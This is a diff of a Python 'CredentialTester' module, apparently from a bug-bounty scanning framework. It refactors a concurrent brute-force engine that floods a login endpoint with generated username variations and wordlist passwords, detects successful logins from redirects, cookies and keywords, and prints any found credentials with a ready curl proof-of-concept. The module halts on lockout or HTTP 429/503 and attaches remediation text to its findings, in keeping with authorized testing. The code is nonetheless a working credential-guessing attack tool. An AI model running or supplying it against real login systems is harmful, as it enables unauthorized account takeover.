         variations: Set[str] = set()
         for username in base_usernames:
             variations.add(username)
             if '@' in username:
-                local_part = username.split('@')[0]
-                variations.add(local_part)
-                variations.add(local_part + '@email.com')
-                variations.add(local_part + '@gmail.com')
+                local = username.split('@')[0]
+                variations.add(local)
+                variations.add(local + '@email.com')
+                variations.add(local + '@gmail.com')
             else:
                 variations.add(username + '@email.com')
                 variations.add(username + '@gmail.com')
                 variations.add(username + '@admin.com')
         return variations
 
-    # ─────────────────────────────────────────────────────────
-    # Core brute-force loop  (enhanced with form-type dispatch)
-    # ─────────────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    # Core brute-force loop — concurrent with live progress bar
+    # ─────────────────────────────────────────────────────────────────────────
     async def _test_brute_force(self, endpoint: Dict):
         """
-        Concurrent brute force — fires self.concurrency requests simultaneously.
-
-        Architecture
-        ────────────
-        • A semaphore caps parallel in-flight requests.
-        • All (username, password) pairs are turned into asyncio Tasks and
-          gathered at once — no serial outer loop waiting for each response.
-        • A shared Event (_found) lets every task abort the moment one
-          succeeds or a hard rate-limit is hit.
-        • Attempt counter is updated atomically via a list (avoids nonlocal
-          rebinding issues with asyncio).
+        Concurrent brute force with live progress bar.
+        • asyncio.Semaphore caps parallel in-flight requests.
+        • asyncio.Event stops all workers the instant creds are found.
+        • Progress bar updates in-place on every completed attempt.
         """
         import itertools
 
@@ -619,232 +456,167 @@ class CredentialTester(BaseModule):
         fields          = endpoint.get('fields', {})
         form_type       = endpoint.get('form_type', 'html_form')
         username_fields = fields.get('username_fields', ['email', 'username', 'user', 'login'])
-        password_field  = fields.get('password_field', 'password')
-
-        self.logger.info(
-            f"Starting CONCURRENT brute force on {url} "
-            f"[form_type={form_type}] [concurrency={self.concurrency}] "
-            f"[fields: {username_fields} / {password_field}]"
-        )
+        password_field  = fields.get('password_field',  'password')
 
         base_usernames, passwords = self._load_wordlists()
         all_usernames  = list(self._generate_username_variations(base_usernames))
         total_attempts = len(all_usernames) * len(passwords)
 
-        self.logger.info(
-            f"{len(all_usernames)} usernames × {len(passwords)} passwords "
-            f"= {total_attempts} total attempts  |  "
-            f"{self.concurrency} concurrent workers"
-        )
+        print(f"\033[96m[*] Usernames (with variations) : {len(all_usernames)}\033[0m")
+        print(f"\033[96m[*] Passwords                   : {len(passwords)}\033[0m")
+        print(f"\033[96m[*] Total attempts              : {total_attempts}\033[0m")
+        print(f"\033[96m[*] Concurrent workers          : {self.concurrency}\033[0m\n")
 
-        # ── Shared state ──────────────────────────────────────
-        semaphore     = asyncio.Semaphore(self.concurrency)
-        found_event   = asyncio.Event()          # set when creds found or hard-stop
-        rate_limited  = [False]                  # mutable flag shared across tasks
-        counter       = [0]                      # atomic-ish attempt counter
+        semaphore    = asyncio.Semaphore(self.concurrency)
+        found_event  = asyncio.Event()
+        rate_limited = [False]
+        counter      = [0]          # completed attempts (thread-safe via GIL + asyncio)
 
-        # ── Single-attempt coroutine ──────────────────────────
         async def attempt(username: str, password: str):
             if found_event.is_set():
-                return                           # abort early if already done
+                return
 
             async with semaphore:
                 if found_event.is_set():
-                    return                       # double-check after acquiring sem
+                    return
 
-                counter[0] += 1
-                attempt_num = counter[0]
-
-                if attempt_num % 50 == 0:
-                    self.logger.info(f"Progress: {attempt_num}/{total_attempts} attempts...")
-
-                p = self._build_payload(
-                    form_type, username, password,
-                    username_fields, password_field
-                )
+                p = self._build_payload(form_type, username, password, username_fields, password_field)
 
                 try:
                     response = None
-
                     if p['use_basic_auth']:
                         response = await self._make_request(
-                            url, method=p['method'],
-                            auth=p['basic_auth_tuple'],
-                            allow_redirects=False, headers=p['headers'],
-                        )
-                    elif isinstance(p['data'], str):          # SOAP / XML
+                            url, method=p['method'], auth=p['basic_auth_tuple'],
+                            allow_redirects=False, headers=p['headers'])
+                    elif isinstance(p['data'], str):
                         response = await self._make_request(
-                            url, method=p['method'],
-                            data=p['data'],
-                            allow_redirects=False, headers=p['headers'],
-                        )
+                            url, method=p['method'], data=p['data'],
+                            allow_redirects=False, headers=p['headers'])
                     elif p['use_json']:
                         response = await self._make_request(
-                            url, method=p['method'],
-                            json=p['data'],
-                            allow_redirects=False, headers=p['headers'],
-                        )
+                            url, method=p['method'], json=p['data'],
+                            allow_redirects=False, headers=p['headers'])
                     else:
                         response = await self._make_request(
-                            url, method=p['method'],
-                            data=p['data'],
-                            allow_redirects=False, headers=p['headers'],
-                        )
+                            url, method=p['method'], data=p['data'],
+                            allow_redirects=False, headers=p['headers'])
+
+                    # ── Update progress bar ───────────────────────────────
+                    counter[0] += 1
+                    self._print_progress(
+                        counter[0], total_attempts,
+                        prefix=f'  \033[96m{username[:20]:<20}\033[0m'
+                    )
 
                     if not response:
                         return
 
-                    # ── Hard rate-limit: stop everything ──────
+                    # ── Rate-limit / lockout check ────────────────────────
                     if response.status in [429, 503]:
                         rate_limited[0] = True
-                        self.logger.warning(
-                            f"Rate limited (HTTP {response.status}) "
-                            f"after {attempt_num} attempts — stopping all workers"
-                        )
+                        sys.stdout.write('\n')
+                        self.logger.warning(f"Rate limited (HTTP {response.status}) after {counter[0]} attempts")
                         found_event.set()
                         return
 
-                    # ── Account lockout ───────────────────────
                     text = await response.text()
-                    lockout_indicators = [
-                        'locked', 'blocked', 'too many attempts',
-                        'try again later', 'suspended', 'account disabled'
-                    ]
-                    if any(ind in text.lower() for ind in lockout_indicators):
-                        self.logger.warning(f"Lockout detected at attempt {attempt_num}")
+                    if any(i in text.lower() for i in ['locked','blocked','too many attempts',
+                                                        'try again later','suspended','account disabled']):
+                        sys.stdout.write('\n')
+                        self.logger.warning(f"Lockout detected at attempt {counter[0]}")
                         found_event.set()
                         return
 
-                    # ── Success check ─────────────────────────
+                    # ── Success check ─────────────────────────────────────
                     if await self._check_login_success(response, url):
-                        self._report_success(
-                            username, password, url, attempt_num,
-                            username_fields, password_field
-                        )
+                        sys.stdout.write('\n')
+                        self._report_success(username, password, url, counter[0], username_fields, password_field)
                         found_event.set()
 
                 except Exception as e:
-                    self.logger.error(f"Attempt {attempt_num} error: {e}")
+                    counter[0] += 1
+                    self.logger.error(f"Attempt {counter[0]} error: {e}")
 
-        # ── Launch all tasks concurrently ─────────────────────
-        tasks = [
-            asyncio.create_task(attempt(u, p))
-            for u, p in itertools.product(all_usernames, passwords)
-        ]
-
-        # gather() runs everything; exceptions inside tasks are caught above
+        # ── Launch all tasks ──────────────────────────────────────────────────
+        tasks = [asyncio.create_task(attempt(u, p))
+                 for u, p in itertools.product(all_usernames, passwords)]
         await asyncio.gather(*tasks, return_exceptions=True)
 
-        # ── Summary ───────────────────────────────────────────
+        # Ensure progress bar ends on its own line
+        if counter[0] < total_attempts:
+            self._print_progress(counter[0], total_attempts)
+
+        print()  # blank line after bar
+
         if rate_limited[0]:
             self._add_rate_limit_finding(url, counter[0])
         elif not found_event.is_set():
-            self.logger.info(
-                f"No credentials found after {counter[0]} attempts on {url}"
-            )
+            print(f"\033[93m[-] No credentials found after {counter[0]} attempts on {url}\033[0m")
 
-    # ─────────────────────────────────────────────────────────
-    # Rate-limit test (unchanged from original)
-    # ─────────────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    # Rate-limit test (kept for compatibility — not called in run())
+    # ─────────────────────────────────────────────────────────────────────────
     async def _test_rate_limiting(self, endpoint: Dict):
-        """Test rate limiting - NO DELAY"""
         url = endpoint['url']
         responses = []
-
         self.logger.info(f"Testing rate limiting on {url} (no delay)")
-
         for i in range(min(5, self.max_attempts)):
             try:
                 response = await self._make_request(
-                    url,
-                    method='POST',
-                    data={'username': f'test{i}@test.com', 'password': 'wrong123'}
-                )
+                    url, method='POST',
+                    data={'username': f'test{i}@test.com', 'password': 'wrong123'})
                 if response:
                     responses.append(response.status)
             except:
                 responses.append('error')
-            # NO SLEEP HERE
 
         if 429 in responses or 503 in responses or 403 in responses:
             self.logger.info(f"Rate limiting detected on {url}")
         else:
-            finding = Finding(
-                module='brute_force',
-                title='Missing Rate Limiting on Authentication',
+            self.add_finding(Finding(
+                module='brute_force', title='Missing Rate Limiting on Authentication',
                 severity='High',
                 description=f'No rate limiting on {url} after {len(responses)} rapid requests',
                 evidence={'endpoint': url, 'requests': len(responses), 'responses': responses},
                 poc=f"Send rapid login requests to {url}",
                 remediation='Implement rate limiting (max 5 attempts per IP per 15 minutes)',
-                cvss_score=7.5,
-                bounty_score=1000,
-                target=url
-            )
-            self.add_finding(finding)
+                cvss_score=7.5, bounty_score=1000, target=url))
 
-    # ─────────────────────────────────────────────────────────
-    # Success detection (unchanged from original)
-    # ─────────────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    # Success detection
+    # ─────────────────────────────────────────────────────────────────────────
     async def _check_login_success(self, response, url: str) -> bool:
-        """Universal login success detection"""
         try:
             status = response.status
-
             if status in [301, 302, 303, 307, 308]:
                 location = response.headers.get('Location', '')
                 if location:
-                    success_paths = ['/dashboard', '/admin', '/home', '/profile', '/welcome', '/panel', '/main']
-                    failure_paths = ['/login', '/signin', '/error', '/fail', '/denied']
-                    if any(p in location.lower() for p in success_paths):
-                        self.logger.info(f"Success: redirect to {location}")
+                    if any(p in location.lower() for p in ['/dashboard','/admin','/home','/profile','/welcome','/panel','/main']):
                         return True
-                    if any(p in location.lower() for p in failure_paths):
+                    if any(p in location.lower() for p in ['/login','/signin','/error','/fail','/denied']):
                         return False
-
             if status == 200:
                 text = await response.text()
-                text_lower = text.lower()
-                failures = ['invalid', 'incorrect', 'failed', 'error', 'wrong', 'denied', 'unauthorized', 'try again']
-                for f in failures:
-                    if f in text_lower:
-                        return False
-                successes = ['welcome', 'dashboard', 'logout', 'profile', 'admin panel', 'successful', 'session', 'token']
-                success_count = sum(1 for s in successes if s in text_lower)
-                cookies = response.headers.get('Set-Cookie', '').lower()
-                if any(c in cookies for c in ['session', 'token', 'auth', 'jwt']):
-                    return True
-                if success_count >= 2:
-                    return True
-
-            if status in [200, 201] and 'application/json' in response.headers.get('Content-Type', ''):
+                tl   = text.lower()
+                for f in ['invalid','incorrect','failed','error','wrong','denied','unauthorized','try again']:
+                    if f in tl: return False
+                success_count = sum(1 for s in ['welcome','dashboard','logout','profile','admin panel','successful','session','token'] if s in tl)
+                cookies = response.headers.get('Set-Cookie','').lower()
+                if any(c in cookies for c in ['session','token','auth','jwt']): return True
+                if success_count >= 2: return True
+            if status in [200,201] and 'application/json' in response.headers.get('Content-Type',''):
                 text = await response.text()
-                if any(k in text.lower() for k in ['token', 'access_token', 'auth_token', 'session']):
-                    return True
-
-            # Basic/Digest: 200 after 401 challenge = success
-            if status == 200 and response.headers.get('WWW-Authenticate'):
-                return True
-
+                if any(k in text.lower() for k in ['token','access_token','auth_token','session']): return True
+            if status == 200 and response.headers.get('WWW-Authenticate'): return True
             return False
-
         except Exception as e:
             self.logger.error(f"Error checking success: {e}")
             return False
 
-    # ─────────────────────────────────────────────────────────
-    # Reporting helpers (unchanged from original)
-    # ─────────────────────────────────────────────────────────
-    def _report_success(
-        self,
-        username: str,
-        password: str,
-        url: str,
-        attempts: int,
-        username_fields: List[str],
-        password_field: str,
-    ):
-        """Report successful login finding"""
+    # ─────────────────────────────────────────────────────────────────────────
+    # Reporting
+    # ─────────────────────────────────────────────────────────────────────────
+    def _report_success(self, username, password, url, attempts, username_fields, password_field):
         sep = "=" * 60
         print(f"\n\033[91m{sep}\033[0m")
         print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
@@ -853,36 +625,22 @@ class CredentialTester(BaseModule):
         print(f"\033[92m      URL      : {url}\033[0m")
         print(f"\033[92m      Attempts : {attempts}\033[0m")
         print(f"\033[91m{sep}\033[0m\n")
-
-        finding = Finding(
+        self.add_finding(Finding(
             module='brute_force',
             title=f'[CREDENTIALS FOUND] {username}:{password} @ {url}',
             severity='Critical',
-            description=(
-                f'Successfully brute-forced login at {url}\n'
-                f'Username: {username}\nPassword: {password}\nAttempts: {attempts}'
-            ),
+            description=f'Successfully brute-forced login at {url}\nUsername: {username}\nPassword: {password}\nAttempts: {attempts}',
             evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
             poc=f"curl -X POST '{url}' -d '{username_fields[0]}={username}&{password_field}={password}'",
             remediation='Implement strong password policy, rate limiting, and account lockout',
-            cvss_score=9.8,
-            bounty_score=5000,
-            target=url
-        )
-        self.add_finding(finding)
+            cvss_score=9.8, bounty_score=5000, target=url))
 
-    def _add_rate_limit_finding(self, url: str, attempts: int):
-        """Add rate limiting finding"""
-        finding = Finding(
-            module='brute_force',
-            title='Rate Limiting Detected During Brute Force',
+    def _add_rate_limit_finding(self, url, attempts):
+        self.add_finding(Finding(
+            module='brute_force', title='Rate Limiting Detected During Brute Force',
             severity='Info',
             description=f'Rate limiting triggered after {attempts} attempts',
             evidence={'attempts': attempts, 'url': url},
             poc=f"Send {attempts} login requests to {url}",
             remediation='Rate limiting is working correctly',
-            cvss_score=0.0,
-            bounty_score=0,
-            target=url
-        )
-        self.add_finding(finding)
+            cvss_score=0.0, bounty_score=0, target=url))
